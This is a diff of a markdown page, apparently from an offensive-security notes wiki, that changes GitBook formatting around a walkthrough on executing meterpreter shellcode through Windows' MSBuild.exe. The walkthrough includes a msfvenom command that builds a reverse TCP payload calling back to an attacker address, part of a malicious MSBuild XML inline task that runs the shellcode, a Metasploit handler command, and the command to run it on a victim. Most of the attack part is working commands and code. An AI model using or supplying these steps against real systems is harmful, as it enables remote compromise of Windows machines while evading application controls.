@@ -6,20 +6,17 @@ It's possible to use a native windows binary MSBuild.exe to compile and execute 
 
 Generate meterpreter shellode in c\#:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-04-20-53-21.png)
 
 Insert shellcode into the shellcode variable in linne 46:
 
-{% tabs %}
-{% tab title="bad.xml" %}
+{% code title="bad.xml" %}
 ```markup
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
          <!-- This inline task executes shellcode. -->
@@ -85,30 +82,25 @@ Insert shellcode into the shellcode variable in linne 46:
 	  </UsingTask>
 	</Project>
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2019-04-04-20-54-14.png)
 
 Spin up a handler in metasploit to catch your shell:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Build and execute malicious payload on the victim system using MSBuild:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/peek-2019-04-04-20-57.gif)
 
